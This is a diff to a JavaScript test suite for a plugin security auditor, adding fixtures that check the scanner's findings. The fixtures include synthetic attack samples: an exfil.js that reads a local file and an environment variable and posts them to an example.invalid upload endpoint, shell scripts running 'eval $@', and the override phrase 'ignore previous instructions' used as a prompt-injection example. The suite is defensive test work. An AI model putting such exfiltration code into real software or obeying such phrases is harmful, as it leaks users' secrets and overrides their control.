@@ -101,6 +101,13 @@ test("unsafe synthetic plugin reports stable IDs, categories, evidence, and high
   const ids = ruleIds(first);
 
   assert.equal(riskLevel(first), "high");
+  assert.deepEqual(first.summary, {
+    findings: 11,
+    bySeverity: { info: 0, low: 0, medium: 5, high: 6, critical: 0 },
+    score: 57,
+    riskLevel: "high",
+    scoreDescription: "Severity-weighted deterministic finding score; not a security rating or token/billing measure."
+  });
   for (const [ruleId, category] of Object.entries(RULE_CATEGORIES)) {
     assert.ok(ids.has(ruleId), `unsafe fixture must exercise ${ruleId}`);
     assertFindingEvidence(findingFor(first, ruleId), category);
@@ -142,6 +149,11 @@ test("MCP manifests accept direct maps and mcp_servers wrappers, and flag unsupp
   const root = await mkdtemp(join(tmpdir(), "plugin-health-auditor-manifest-"));
   t.after(() => rm(root, { recursive: true, force: true }));
 
+  await writeFile(join(root, ".mcp.json"), '{\n  "direct": {\n    "command": "node",\n  }\n}\n');
+  const malformed = findingFor(await auditPath(root), "PHA-MANIFEST-001");
+  assert.ok(malformed.line > 1, "multiline malformed JSON should report a meaningful line");
+  assert.ok(malformed.evidence.length > 0, "malformed JSON evidence should remain useful without exposing parser details");
+
   await writeFile(join(root, ".mcp.json"), JSON.stringify({ direct: { command: "node", args: ["server.mjs"] } }));
   assert.equal(ruleIds(await auditPath(root)).has("PHA-MANIFEST-004"), false);
 
@@ -169,6 +181,86 @@ test("incomplete bounded scans receive coverage findings and cannot be low risk"
   const oversized = await auditPath(root, { maxFileBytes: 1 });
   assert.ok(ruleIds(oversized).has("PHA-SCAN-002"));
   assert.notEqual(riskLevel(oversized), "low");
+
+  const skippedSamples = await mkdtemp(join(tmpdir(), "plugin-health-auditor-skipped-samples-"));
+  t.after(() => rm(skippedSamples, { recursive: true, force: true }));
+  for (let index = 0; index < 125; index += 1) {
+    await writeFile(join(skippedSamples, `oversized-${String(index).padStart(3, "0")}.txt`), "xx");
+  }
+  const boundedSamples = await auditPath(skippedSamples, { maxFileBytes: 1 });
+  assert.equal(boundedSamples.inventory.skipped.oversized, 125);
+  assert.equal(boundedSamples.inventory.skipped.oversizedPaths.length, 100);
+  assert.match(findingFor(boundedSamples, "PHA-SCAN-002").evidence, /125/);
+
+  const adversarial = await mkdtemp(join(tmpdir(), "plugin-health-auditor-adversarial-"));
+  t.after(() => rm(adversarial, { recursive: true, force: true }));
+  await mkdir(join(adversarial, "dist"), { recursive: true });
+  await mkdir(join(adversarial, "build"), { recursive: true });
+  await mkdir(join(adversarial, "test"), { recursive: true });
+  await writeFile(join(adversarial, "dist", "risky.js"), [
+    '// synthetic metadata: { id: "PHA-EXEC-001", pattern: /exec\\s*\\(/ }',
+    'exec("synthetic command");',
+    'await fetch("https://example.invalid/synthetic-endpoint");',
+    ''
+  ].join("\n"));
+  await writeFile(join(adversarial, "build", "risky.sh"), '# eval "$IGNORED_COMMENT"\neval $@\n`printf synthetic-shell`\n');
+  await writeFile(join(adversarial, "build", "constructed.sh"), 'eval $(cat synthetic-command.txt)\n');
+  await writeFile(join(adversarial, "test", "ignored.txt"), "exec(\"must not be scanned\")\n");
+
+  await writeFile(join(adversarial, "ordinary-prose.md"), 'The test, run, and data terms are ordinary prose here. Markdown documents `eval "$COMMAND"` and `printf synthetic` as examples.\n');
+  await mkdir(join(adversarial, "skills", "ordinary-test"), { recursive: true });
+  await mkdir(join(adversarial, "skills", "ordinary-run"), { recursive: true });
+  await mkdir(join(adversarial, "skills", "ordinary-data"), { recursive: true });
+  for (const name of ["test", "run", "data"]) {
+    await writeFile(join(adversarial, "skills", `ordinary-${name}`, "SKILL.md"), `---\nname: ${name}\ndescription: Synthetic ordinary prose example.\n---\n\nThis document discusses ${name} as an ordinary noun.\n`);
+  }
+  await mkdir(join(adversarial, "skills", "explicit-self"), { recursive: true });
+  await writeFile(
+    join(adversarial, "skills", "explicit-self", "SKILL.md"),
+    "---\nname: test\ndescription: Synthetic explicit self-reference.\n---\n\nInvoke the `test` skill when this skill is selected.\n"
+  );
+  await mkdir(join(adversarial, "skills", "ordinary-build"), { recursive: true });
+  await writeFile(join(adversarial, "skills", "ordinary-build", "SKILL.md"), "---\nname: build\ndescription: Synthetic common-name prose.\n---\n\nRun build after tests complete.\n");
+  await mkdir(join(adversarial, "skills", "explicit-build"), { recursive: true });
+  await writeFile(join(adversarial, "skills", "explicit-build", "SKILL.md"), "---\nname: build\ndescription: Synthetic explicit self-reference.\n---\n\nRun the `build` skill before returning.\n");
+
+  await writeFile(join(adversarial, "prompt.md"), 'The scanner source uses lower.includes("ignore previous instructions") as a literal example.\n');
+  await writeFile(join(adversarial, "docs.md"), '// readFileSync("local.txt") is documented at https://docs.example.invalid/readFileSync\n');
+  await writeFile(join(adversarial, "exfil.js"), [
+    'const decoy = readFileSync("unrelated.txt");',
+    `const padding = "${"x".repeat(320)}";`,
+    'const local = readFileSync("local.txt");',
+    'const value = process.env.SYNTHETIC_VALUE;',
+    'await fetch("https://example.invalid/upload", { body: local + value });',
+    ''
+  ].join("\n"));
+
+  for (let index = 0; index < 125; index += 1) {
+    await mkdir(join(adversarial, `area-${String(index).padStart(3, "0")}`, "test"), { recursive: true });
+  }
+
+  const report = await auditPath(adversarial);
+  const execution = findings(report).filter((item) => item.ruleId === "PHA-EXEC-001");
+  assert.ok(execution.some((item) => item.file === "dist/risky.js"), "dist files must be scanned");
+  assert.ok(execution.some((item) => item.file === "build/risky.sh"), "build files must be scanned");
+  assert.ok(findings(report).some((item) => item.ruleId === "PHA-NET-001" && item.file === "dist/risky.js"));
+  assert.ok(findings(report).some((item) => item.ruleId === "PHA-PROMPT-001" && item.file === "prompt.md"));
+  assert.equal(findings(report).some((item) => item.ruleId === "PHA-EXFIL-001" && item.file === "docs.md"), false);
+  const exfiltration = findingFor(report, "PHA-EXFIL-001");
+  assert.equal(exfiltration.file, "exfil.js");
+  assert.equal(exfiltration.severity, "high");
+  assert.equal(exfiltration.confidence, "medium");
+  assert.ok(findings(report).some((item) => item.ruleId === "PHA-EXEC-002" && item.file === "build/risky.sh"));
+  assert.ok(findings(report).some((item) => item.ruleId === "PHA-EXEC-002" && item.file === "build/constructed.sh"));
+  assert.equal(findings(report).some((item) => item.ruleId === "PHA-EXEC-001" && item.file === "ordinary-prose.md"), false);
+  assert.equal(findings(report).some((item) => item.ruleId === "PHA-INSTR-002" && item.file === "skills/explicit-self/SKILL.md"), true);
+  assert.equal(findings(report).some((item) => item.ruleId === "PHA-INSTR-002" && item.file === "skills/explicit-build/SKILL.md"), true);
+  for (const name of ["test", "run", "data", "build"]) {
+    assert.equal(findings(report).some((item) => item.ruleId === "PHA-INSTR-002" && item.file === `skills/ordinary-${name}/SKILL.md`), false);
+  }
+  assert.ok(report.inventory.skipped.ignoredDirectories.some((item) => item === "test" || item.endsWith("/test")));
+  assert.equal(report.inventory.skipped.ignoredDirectoriesCount, 126);
+  assert.ok(report.inventory.skipped.ignoredDirectories.length <= 100);
 });
 
 test(".env variants are scanned with redacted evidence and backslash-separated instruction paths are recognized", async (t) => {
